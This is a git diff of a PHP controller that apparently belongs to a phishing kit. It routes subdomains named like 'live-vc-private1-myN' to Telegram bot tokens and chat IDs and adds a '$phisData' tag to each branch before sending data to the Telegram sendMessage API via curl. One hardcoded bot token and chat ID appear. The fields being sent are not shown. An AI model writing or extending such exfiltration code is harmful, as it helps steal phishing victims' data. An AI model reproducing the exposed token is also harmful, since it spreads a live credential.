@@ -90,80 +90,91 @@ class HomeController extends Controller
             // BOT 6
             $bot_token = "8004727206:AAHF_aciKT9HnpKnSBWPTob727wTaUlLAJI";
             $chat_id = "7637087335";
+            $phisData = "MY6";
         } else   if ($subdomain == "live-vc-private1-my7") {
             // BOT 7
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY7";
         } else  if ($subdomain == "live-vc-private1-my8") {
             // BOT 8
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY8";
         } else  if ($subdomain == "live-vc-private1-my9") {
             // BOT 9
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY9";
         } else  if ($subdomain == "live-vc-private1-my10") {
             // BOT 10
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY10";
         } else  if ($subdomain == "live-vc-private1-my11") {
             // BOT 11
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY11";
         } else  if ($subdomain == "live-vc-private1-my12") {
             // BOT 12
             $bot_token = "";
             $chat_id = "";
+            $phisData = "MY12";
         } else  if ($subdomain == "live-vc-private1-my13") {
             // BOT 13
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY13";
         } else  if ($subdomain == "live-vc-private1-my14") {
             // BOT 14
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY14";
         } else  if ($subdomain == "live-vc-private1-my15") {
             // BOT 15
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY15";
         } else  if ($subdomain == "live-vc-private1-my16") {
             // BOT 16
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY16";
         } else  if ($subdomain == "live-vc-private1-my17") {
             // BOT 17
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY17";
         } else  if ($subdomain == "live-vc-private1-my18") {
             // BOT 18
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY18";
         } else  if ($subdomain == "live-vc-private1-my19") {
             // BOT 19
             $bot_token = "";
 
             $chat_id = "";
-        } else  if ($subdomain == "live-vc-private1-my19") {
-            // BOT 12
-            $bot_token = "";
-
-            $chat_id = "";
+            $phisData = "MY19";
         } else  if ($subdomain == "live-vc-private1-my20") {
             // BOT 20
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY20";
         } else  if ($subdomain == "live-vc-private1-my21") {
             // BOT 21
             $bot_token = "";
 
             $chat_id = "";
+            $phisData = "MY21";
         }
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
@@ -172,7 +183,7 @@ class HomeController extends Controller
 
 
         $ch = curl_init();
-        $phisData = "MY2";
+
         // Set cURL options
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
